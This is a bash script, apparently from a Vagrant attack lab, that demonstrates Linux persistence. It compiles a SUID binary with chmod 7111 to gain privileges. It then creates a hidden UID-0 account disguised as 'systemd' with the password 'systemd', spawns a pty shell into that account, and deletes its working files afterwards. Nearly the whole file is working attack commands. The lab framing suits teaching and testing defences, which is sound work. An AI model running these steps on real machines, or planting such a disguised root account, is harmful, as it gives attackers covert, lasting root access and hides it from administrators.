#!/bin/bash

### SUID PERSISTENCE ###
# Build Binary
mkdir /tmp/persistence
cd /tmp/persistence
cp /vagrant/attack/3_Persistence/binarysuid suid.c
gcc suid.c -o suid

# Run Exploit
chmod 7111 suid
sudo -u vagrant -H bash << EOF
  echo "whoami: $(whoami) (before privexec)"
  ./suid | cat
  echo "whoami: $(whoami) (after privexec)"
EOF

### CREATE ACCOUNT PERSISTENCE ###
# Create root user
if id systemd &>/dev/null;
then
  echo "systemd: user already exists."
else
  useradd -ou 0 -g 0 systemd
  chpasswd <<< "systemd:systemd"
fi

# Run Exploit
# echo "import pty; pty.spawn('/bin/bash')" > /tmp/persistence/shell.py

sudo -u vagrant -H bash << EOF
  #!/bin/bash
  python3 /tmp/persistence/shell.py
  sudo -u systemd -H bash <<!
    systemd
    echo "whoami: $(whoami) (after create account)"
    if [[ $EUID -ne 0 ]]
    then
      echo "I am gRoot"
    fi
  !
EOF
# python3 /tmp/persistence/shell.py
# echo '2'
# su systemd | cat
# systemd
# echo "whoami: $(whoami) (after create account)"

# Cleanup
cd /
rm -rf /tmp/persistence
echo "Cleanup done."